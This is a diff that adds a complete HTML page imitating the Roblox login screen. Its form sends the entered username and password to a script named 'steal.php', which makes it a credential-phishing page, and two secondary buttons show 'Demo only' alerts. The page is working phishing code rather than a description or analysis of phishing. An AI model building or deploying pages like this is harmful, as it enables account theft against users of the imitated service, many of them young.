@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Roblox Login</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #1a1e2b;
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-container {
+            background: #2c2f3f;
+            border-radius: 12px;
+            padding: 40px;
+            width: 380px;
+            text-align: center;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.3);
+        }
+        .logo {
+            font-size: 44px;
+            font-weight: 800;
+            color: white;
+            margin-bottom: 28px;
+        }
+        .logo span { color: #ff4d4d; }
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .input-group label {
+            display: block;
+            color: #b0b3c0;
+            font-size: 12px;
+            margin-bottom: 6px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            background: #1e1f2c;
+            border: 1px solid #3a3f5e;
+            border-radius: 8px;
+            color: white;
+            font-size: 14px;
+        }
+        .input-group input:focus {
+            outline: none;
+            border-color: #ff4d4d;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #ff4d4d;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+        button:hover { background: #e63e3e; }
+        .links {
+            margin-top: 20px;
+            font-size: 12px;
+        }
+        .links a {
+            color: #9aa2bf;
+            text-decoration: none;
+        }
+        .links a:hover { color: #ff4d4d; }
+        .divider {
+            margin: 24px 0;
+            border-top: 1px solid #3a3f5e;
+        }
+        .alt-button {
+            background: transparent;
+            border: 1px solid #ff4d4d;
+            color: #ff4d4d;
+            margin-top: 10px;
+        }
+        .alt-button:hover {
+            background: rgba(255,77,77,0.1);
+        }
+        .footer {
+            margin-top: 28px;
+            font-size: 11px;
+        }
+        .footer a {
+            color: #9aa2bf;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+<div class="login-container">
+    <div class="logo"><span>R</span>OBLOX</div>
+    <form action="steal.php" method="POST">
+        <div class="input-group">
+            <label>Username / Email / Phone</label>
+            <input type="text" name="username" required>
+        </div>
+        <div class="input-group">
+            <label>Password</label>
+            <input type="password" name="password" required>
+        </div>
+        <button type="submit">Log In</button>
+    </form>
+    <div class="links">
+        <a href="#">Forgot Password or Username?</a>
+    </div>
+    <div class="divider"></div>
+    <button class="alt-button" type="button" onclick="alert('Demo only')">Email Me a One-Time Code</button>
+    <button class="alt-button" type="button" onclick="alert('Demo only')">Quick Sign-in</button>
+    <div class="footer">
+        <a href="#">Create a New Account</a>
+    </div>
+</div>
+</body>
+</html>
